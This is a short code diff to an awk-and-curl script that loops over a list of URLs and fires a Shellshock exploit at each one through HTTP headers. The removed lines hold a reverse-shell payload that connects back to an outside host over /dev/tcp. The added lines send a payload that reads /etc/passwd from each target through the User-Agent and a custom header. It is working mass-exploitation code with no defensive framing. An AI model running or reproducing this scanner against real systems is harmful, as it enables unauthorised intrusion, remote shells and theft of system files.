@@ -6,8 +6,9 @@
 		count += 1;
 		sub(/\x0d/, "", $0)
 		print $0;
-		shock = "\"() { :; }; /bin/bash -i > /dev/tcp/comealong.oicp.net/1888 0<&1 2>&1\" \"" $0 "\" > /dev/null";
-		#print "curl -A" shock " -v";
-		system("curl -A" shock " -v");
+		shock = " () { :;};a=`/bin/cat /etc/passwd`;echo $a";
+		cmd = "curl -v -s -m 10 --retry 3 -A '\''" shock "'\'' -H '\''X-Test:" shock "'\'' \"" $0 "\" 2>&1"
+		print cmd;
+		system(cmd);
 	}
 } END {print "count: " count}'
